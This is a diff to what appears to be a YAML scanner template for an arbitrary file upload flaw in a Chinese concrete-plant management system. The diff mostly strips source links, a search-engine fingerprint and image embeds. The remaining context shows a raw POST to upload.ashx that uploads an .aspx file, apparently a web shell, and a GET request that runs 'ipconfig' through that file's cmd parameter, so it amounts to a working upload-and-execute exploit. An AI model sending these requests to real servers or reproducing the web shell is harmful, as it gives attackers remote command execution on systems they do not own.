@@ -3,12 +3,8 @@ info:
   name: 预拌砼综合管理系统upload.ashx存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lxzaw2pgx1c6yqp3'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lxzaw2pgx1c6yqp3
-    fofa: body="Libs/Platform.lib"
 http:
 - raw:
   - 'POST /WebUpload/server/upload.ashx HTTP/1.1
@@ -107,7 +103,7 @@ http:
 
     Response.End();%>
 
-    ------geckoformboundary8a2afaa88de91add9545aab5a13188a2--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771858795064-2d007bbb-3154-4991-a31d-92ca49695093.png)
+    ------geckoformboundary8a2afaa88de91add9545aab5a13188a2--
 
     访问返回的地址'
   redirects: false
@@ -118,7 +114,7 @@ http:
 - raw:
   - 'GET /WebUpload/Upload/GpAgreeFile/2026-01-29/Others/75cf5209-d0cd-4305-b9f2-88c0b4b744d0.aspx?cmd=ipconfig HTTP/1.1
 
-    Host:![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771858795420-a43bc915-c377-401a-92d6-cc27c34f8ee0.png)'
+    Host:'
   redirects: false
   matchers:
   - status:
